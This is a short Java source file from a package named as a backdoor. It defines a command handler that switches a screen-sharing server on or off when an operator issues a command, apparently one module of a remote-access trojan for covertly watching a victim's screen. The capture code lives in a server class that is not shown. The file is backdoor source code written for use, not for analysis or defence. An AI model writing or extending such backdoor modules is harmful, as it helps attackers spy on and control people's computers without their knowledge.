package net.jaguargaming.backdoor.commandhandlers;

import java.io.IOException;

import net.jaguargaming.backdoor.server.ScreenshareServer;

public class CMDscreenshare {
	
	public static void handle(String[] args, ScreenshareServer ssserver) throws IllegalArgumentException, IOException {
		if (args.length != 3) {
			throw new IllegalArgumentException("Wrong argument length");
		}
		if (args[0].equalsIgnoreCase("on"))
			ssserver.startScreenShare();
		else if (args[0].equalsIgnoreCase("off"))
			ssserver.stopScreenShare();
		else
			throw new IllegalArgumentException("Wrong state argument");
	}
	
}
